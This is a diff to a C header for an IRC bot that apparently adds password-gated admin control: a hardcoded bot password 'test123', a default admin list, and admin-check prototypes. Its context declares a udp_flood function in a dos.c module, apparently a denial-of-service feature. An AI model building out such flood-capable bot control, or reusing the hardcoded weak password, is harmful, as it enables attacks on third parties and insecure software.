@@ -47,9 +47,10 @@
 #define CHANNEL    "#nullbyte"
 #define U_NAME     "JSchmoeBot"
 #define N_NAME     "JSchmoeBot"
-#define PWORD      NULL
+#define IRC_PWORD  NULL
+#define BOT_PWORD  "test123"  
 
-//extern const char *admins[] = {"dontrustme"};
+extern const char *default_admins[] = {"dontrustme"};
 
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 /*
@@ -83,6 +84,8 @@ typedef struct _account {
     char n_name[MAX_NAME];        // nickname
     char *pword;            // username's password
     char *channel;            // channel/privmsg
+    char **admins;
+    unsigned short num_admins;
 } Account, *pAccount;
 
 /*
@@ -211,6 +214,11 @@ void format_message (pMessage);
 // recv.c
 int cleanup (SOCKET, pAccount, pMessage);
 void start_recv (SOCKET, pAccount);
+
+// exec.c
+int check_pass (pMessage);
+int add_admin (pAccount, pMessage);
+int is_admin (pAccount, pMessage);
 
 // dos.c
 void udp_flood (SOCKET s);
